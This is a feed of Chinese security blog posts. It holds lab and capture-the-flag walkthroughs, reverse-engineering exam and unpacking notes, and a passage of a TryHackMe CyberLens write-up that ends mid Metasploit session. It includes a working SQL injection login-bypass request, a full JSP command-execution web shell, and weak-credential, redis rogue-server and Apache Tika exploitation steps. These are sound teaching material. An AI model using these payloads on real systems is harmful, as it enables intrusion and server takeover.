class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">119.45.21.241:8082</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">119.45.21.241:8082</span>/admin/login.php<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">119.45.21.241:8082</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">133</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">133</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=<span class="hljs-number">5</span>sbj1i45p9jvcjk806crraqci1<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">72</span><br><br><span class="hljs-attribute">user</span>=-<span class="hljs-number">1</span>&#x27;+uniselecton+selselectect+<span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>+%<span class="hljs-number">23</span>&amp;password=<span class="hljs-number">123456</span>&amp;code=<span class="hljs-number">8</span>a8b&amp;submit=flase&amp;submit.x=<span class="hljs-number">36</span>&amp;submit.y=<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-20.png" alt="image-20241213224814230"></p><p>再返回网页刷新一下就进入后台了</p><p>然后文件上传</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-21.png" alt="image-20241213225101895"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-22.png" alt="image-20241213225129086"></p><p>抓包改一下Content-Type: image/png就行</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-23.png" alt="image-20241213225334392"></p><p>注意文件名</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-24.png" alt="image-20241213225512825"></p><p>拼接路径访问即可</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-25.png" alt="image-20241213225552618"></p><p>蚁剑连接，在根目录看flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-26.png" alt="image-20241213225631833"></p><h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><h2 id="Flag1-4"><a href="#Flag1-4" class="headerlink" title="Flag1"></a>Flag1</h2><p>tomcat默认页面</p><p>访问登录页面抓包爆破</p><p>得到用户名密码<code>tomcat:qwe123</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-27.png" alt="image-20241214132224506"></p><p>上传打成war包的jsp马</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-28.png" alt="image-20241214135225642"></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jsp"># cmd.jsp<br>&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-29.png" alt="image-20241214135148839"></p><p>执行命令得到flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-30.png" alt="image-20241214135300717"></p><h1 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h1><h2 id="Flag1-5"><a href="#Flag1-5" class="headerlink" title="Flag1"></a>Flag1</h2><p>fscan扫到redis未授权</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-31.png" alt="image-20241214135525955"></p><p>但计划任务和公钥都写不了</p><p>用这个工具<a href="https://github.com/vulhub/redis-rogue-getshell">vulhub/redis-rogue-getshell: redis 4.x/5.x master/slave getshell module</a></p><p>试了试，一直报错</p><p>应该是编译.so文件的问题，github上搜了个现成的打出来了</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-32.png" alt="image-20241214204043034"></p><h1 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h1><h2 id="Flag1-6"><a href="#Flag1-6" class="headerlink" title="Flag1"></a>Flag1</h2><p>fcsan扫到nacos</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-33.png" alt="image-20241214152343425"></p><p>弱口令</p><p>nacos<br>nacos</p><p>登录</p><p>在配置文件中发现shirokey<br><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-34.png" alt="image-20241214152509973"></p><p>猜测另一台主机为shiro</p><p>直接用工具</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-35.png" alt="image-20241214152602666"></p><p>执行命令得到flag</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/meetsec-36.png" alt="image-20241214152626039"></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>面试</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HENU22级逆向分析技术期末考试</title>
    <link href="/2025/04/11/HENU22%E7%BA%A7%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"/>
    <url>/2025/04/11/HENU22%E7%BA%A7%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h1><p>先F8直到通用寄存器只有ESP为红色时</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160215415.png" alt="image-20250411083942301"></p><p>右键ESP，选择HW break [ESP]</p><p>然后f9运行</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160232079.png" alt="image-20250411084040128"></p><p>然后一直F8单步，知道发现retn返回到入口点，这里需要ctrl+a分析</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160235983.png" alt="image-20250411084324543"></p><p>脱壳</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160238815.png" alt="image-20250411084400451"></p><p>脱壳成功</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160241537.png" alt="image-20250411084739932"></p><h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p>用ida打开2212080174.exe</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160243881.png" alt="image-20250411082135569"></p><p>查看sub_401005最里面的函数</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160245760.png" alt="image-20250411082216671"></p><p>将输入的用户名和密码存入到了数组v6中</p><p>查看sub_40100A最里面的函数</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160247823.png" alt="image-20250411082419187"></p><p>关键在<code>(*(_DWORD *)&amp;byte_438DC0 ^ *(_DWORD *)&amp;byte_438DC4) == a2 &amp;&amp; a1 == *(_DWORD *)&amp;byte_438DC4</code></p><p>其中a1为用户名，a2为密码</p><p>要求用户名为byte_438DC4的值，密码为byte_438DC0异或byte_438DC4后的结果</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160644246.png" alt="image-20250418160640700"></p><p>按小端序列</p><p>byte_438DC0为<code>0xD9E5C43C</code></p><p>byte_438DC4为<code>0x120801**</code></p><p>异或结果为0xcbedc5**</p><p>所以密码为cbedc5**</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/20250418160605239.png" alt="image-20250418160602012"></p>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>考试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向分析实验4 手动脱壳</title>
    <link href="/2025/03/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C4%20%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2025/03/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C4%20%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><h2 id="查找尾部跳转指令"><a href="#查找尾部跳转指令" class="headerlink" title="查找尾部跳转指令"></a>查找尾部跳转指令</h2><p><strong>使用OllyDbg分析Lab18-01.exe程序，通过查找尾部跳转指令JMP找到程序的入口点OEP，完成手动脱壳</strong></p><p>在下面发现尾部跳转指令</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-1.png" alt="image-20250319161636809"></p><p>F4运行到此处后，F8步入跳转，找到入口点<code>0040154f</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-2.png" alt="image-20250319161940992"></p><p>脱壳</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-3.png" alt="image-20250319162120613"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-4.png" alt="image-20250319162242391"></p><p>运行生成的exe文件</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-5.png" alt="image-20250319162407812"></p><p>打开<code>ImportREC</code>  选择刚运行的进程，依次点击 <strong>自动搜索</strong> <strong>获取输入表</strong> <strong>修复转存文件</strong>即可</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-6.png" alt="image-20250319162800690"></p><p>用PEID检查，脱壳成功</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-7.png" alt="image-20250319162923099"></p><h2 id="堆栈平衡原理"><a href="#堆栈平衡原理" class="headerlink" title="堆栈平衡原理"></a>堆栈平衡原理</h2><p><strong>使用OllyDbg分析Lab18-03.exe程序，通过堆栈平衡原理使用pushad、popad和硬件断点，找到程序的入口点OEP，完成手动脱壳</strong></p><p>发现pushfd和pushad</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-8.png" alt="image-20250319163213154"></p><p>F8运行到pushfd和pushad下面的call指令处，右键右边的ESP寄存器，点击数据窗口跟随</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-9.png" alt="image-20250319163714561"></p><p>选择四个字节，打上硬件访问断点</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-10.png" alt="image-20250319163852939"></p><p>F9运行即来到断点位置</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-11.png" alt="image-20250319164222175"></p><p>F8步过一直到retn处跳转后来到入口点，按ctrl+a分析代码</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-12.png" alt="image-20250319164426942"></p><p>脱壳，注意OllyDump时不要勾选下面的“重建输入表”，否则会直接重建成功，使exe文件快速运行完毕导致ImportREC无法捕捉进程</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-14.png" alt="image-20250319165225722"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-15.png" alt="image-20250319165510220"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-16.png" alt="image-20250319165825700"></p><h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p><strong>使用OllyDbg分析Lab18-04.exe程序，通过ESP定律找到程序的入口点OEP，完成手动脱壳</strong></p><p>先F8直到通用寄存器只有ESP为红色时</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-17.png" alt="image-20250319170508743"></p><p>右键ESP，选择HW break [ESP]</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-18.png" alt="image-20250319170607251"></p><p>然后F9运行</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-19.png" alt="image-20250319170806782"></p><p>F8单步，发现retn返回到入口点，ctrl+a分析</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-20.png" alt="image-20250319170956853"></p><p>脱壳</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-21.png" alt="image-20250319171045883"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-22.png" alt="image-20250319171150987"></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/%E9%80%86%E5%90%91%E5%AE%9E%E9%AA%8C4-23.png" alt="image-20250319171243236"></p>]]></content>
    
    
    
    <tags>
      
      <tag>实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM CyberLens</title>
    <link href="/2025/03/08/%5BTHM%5DCyberLens/"/>
    <url>/2025/03/08/%5BTHM%5DCyberLens/</url>
    
    <content type="html"><![CDATA[<h1 id="THM-CyberLens"><a href="#THM-CyberLens" class="headerlink" title="[THM] CyberLens"></a>[THM] CyberLens</h1><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>nmap扫描</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># Nmap 7.95 scan initiated Wed Mar  5 23:21:10 2025 as: /usr/lib/nmap/nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.60.132</span><br>Increasing send delay for 10.10.60.132 from 0 to 5 due to 1357 out of 3392 dropped probes since last increase.<br>Increasing send delay for 10.10.60.132 from 5 to 10 due to 11 out of 17 dropped probes since last increase.<br>Nmap scan report for cyberlens.thm (10.10.60.132)<br>Host is up (0.13s latency).<br>Not shown: 65519 closed tcp ports (reset)<br>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Apache httpd 2.4.57 ((Win64))<br>|_http-title: CyberLens: Unveiling the Hidden Matrix<br>| http-methods: <br>|   Supported Methods: OPTIONS HEAD GET POST TRACE<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/2.4.57 (Win64)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br>|_ssl-date: 2025-03-06T04:35:13+00:00<span class="hljs-comment">; 0s from scanner time.</span><br>| ssl-cert: Subject: <span class="hljs-attr">commonName</span>=CyberLens<br>| Issuer: <span class="hljs-attr">commonName</span>=CyberLens<br>| Public Key type: rsa<br>| Public Key bits: 2048<br>| Signature Algorithm: sha256WithRSAEncryption<br>| Not valid before: 2025-03-05T04:15:35<br>| Not valid after:  2025-09-04T04:15:35<br>| MD5:   4de0:fcc9:680f:b184:29d8:1f45:a0de:2f46<br>|_SHA-1: e46b:f7ef:437b:fe70:0b37:bace:f6fa:4180:78da:fd3b<br>| rdp-ntlm-info: <br>|   Target_Name: CYBERLENS<br>|   NetBIOS_Domain_Name: CYBERLENS<br>|   NetBIOS_Computer_Name: CYBERLENS<br>|   DNS_Domain_Name: CyberLens<br>|   DNS_Computer_Name: CyberLens<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2025-03-06T04:35:05+00:00<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49665/tcp open  msrpc         Microsoft Windows RPC<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49668/tcp open  msrpc         Microsoft Windows RPC<br>49669/tcp open  msrpc         Microsoft Windows RPC<br>49670/tcp open  msrpc         Microsoft Windows RPC<br>49677/tcp open  msrpc         Microsoft Windows RPC<br>61777/tcp open  http          Jetty 8.y.z-SNAPSHOT<br>|_http-server-header: Jetty(8.y.z-SNAPSHOT)<br>| http-methods: <br>|   Supported Methods: POST GET PUT OPTIONS HEAD<br>|_  Potentially risky methods: PUT<br>|_http-title: Site doesn&#x27;t have a title (text/plain).<br>|_http-cors: HEAD GET<br>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(<span class="hljs-attr">V</span>=<span class="hljs-number">7.95</span>%E=<span class="hljs-number">4</span>%D=<span class="hljs-number">3</span>/<span class="hljs-number">5</span>%OT=<span class="hljs-number">80</span>%CT=<span class="hljs-number">1</span>%CU=<span class="hljs-number">43936</span>%PV=Y%DS=<span class="hljs-number">4</span>%DC=T%G=Y%TM=<span class="hljs-number">67</span>C92601<br>OS:%<span class="hljs-attr">P</span>=x<span class="hljs-number">86_64</span>-pc-linux-gnu)SEQ(SP=<span class="hljs-number">102</span>%GCD=<span class="hljs-number">2</span>%ISR=<span class="hljs-number">10</span>C%TI=I%CI=I%II=I%SS=S%TS=U<br>OS:)SEQ(<span class="hljs-attr">SP</span>=<span class="hljs-number">103</span>%GCD=<span class="hljs-number">1</span>%ISR=<span class="hljs-number">107</span>%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=<span class="hljs-number">103</span>%GCD=<span class="hljs-number">1</span>%ISR=<br>OS:109%<span class="hljs-attr">TI</span>=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=<span class="hljs-number">103</span>%GCD=<span class="hljs-number">1</span>%ISR=<span class="hljs-number">10</span>C%TI=I%CI=I%II=I%SS=<br>OS:S%<span class="hljs-attr">TS</span>=U)SEQ(SP=<span class="hljs-number">108</span>%GCD=<span class="hljs-number">1</span>%ISR=<span class="hljs-number">10</span>C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M508NW8N<br>OS:NS%<span class="hljs-attr">O2</span>=M508NW8NNS%O3=M508NW8%O4=M508NW8NNS%O5=M508NW8NNS%O6=M508NNS)WIN(W<br>OS:<span class="hljs-attr">1</span>=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=<span class="hljs-number">80</span>%W=FFFF%<br>OS:<span class="hljs-attr">O</span>=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="hljs-number">80</span>%S=O%A=S+%F=AS%RD=<span class="hljs-number">0</span>%Q=)T2(R=Y%DF=Y%<br>OS:<span class="hljs-attr">T</span>=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S=Z%A=S%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)T3(R=Y%DF=Y%T=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S=Z%A=O%F=AR%O=%RD<br>OS:=0%<span class="hljs-attr">Q</span>=)T4(R=Y%DF=Y%T=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S=A%A=O%F=R%O=%RD=<span class="hljs-number">0</span>%Q=)T5(R=Y%DF=Y%T=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S<br>OS:=Z%<span class="hljs-attr">A</span>=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S=A%A=O%F=R%O=%RD=<span class="hljs-number">0</span>%Q=)T7(R<br>OS:=Y%<span class="hljs-attr">DF</span>=Y%T=<span class="hljs-number">80</span>%W=<span class="hljs-number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)U1(R=Y%DF=N%T=<span class="hljs-number">80</span>%IPL=<span class="hljs-number">164</span>%UN=<span class="hljs-number">0</span>%<br>OS:<span class="hljs-attr">RIPL</span>=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=<span class="hljs-number">80</span>%CD=Z)<br><br>Network Distance: 4 hops<br>TCP Sequence Prediction: <span class="hljs-attr">Difficulty</span>=<span class="hljs-number">259</span> (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: OS: Windows<span class="hljs-comment">; CPE: cpe:/o:microsoft:windows</span><br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2025-03-06T04:35:08<br>|_  start_date: N/A<br><br>TRACEROUTE (using port 8080/tcp)<br>HOP RTT       ADDRESS<br>1   2.76 ms   10.2.0.1<br>2   ... 3<br>4   132.34 ms cyberlens.thm (10.10.60.132)<br><br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Wed Mar  5 23:35:13 2025 -- 1 IP address (1 host up) scanned in 843.81 seconds</span><br></code></pre></td></tr></table></figure><p>可以发现存在很多常见的服务</p><p><code>80</code>和<code>61777</code>上有web服务</p><p><code>80</code>端口上的web中有个文件上传功能，可以获取文件元数据，其功能由<code>61777</code>端口的服务提供：</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/cyberlens-1.png" alt="image-20250306124010369"></p><p>访问<code>61777</code>查看，这是一个<code>Apache Tika 1.17 Server</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/cyberlens-2.png" alt="image-20250306124310251"></p><p>直接去搜索nday</p><p><a href="https://www.exploit-db.com/exploits/47208">Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit) - Windows remote Exploit</a></p><p>这是一个<code>Metasploit</code>的模块，所以接下来在Metasploit中继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs idl">msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set lhost tun0<br>lhost =&gt; 10.2.26.216<br>msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set RHOSTS cyberlens.thm<br>RHOSTS =&gt; cyberlens.thm<br>msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; set rport 61777<br>rport =&gt; 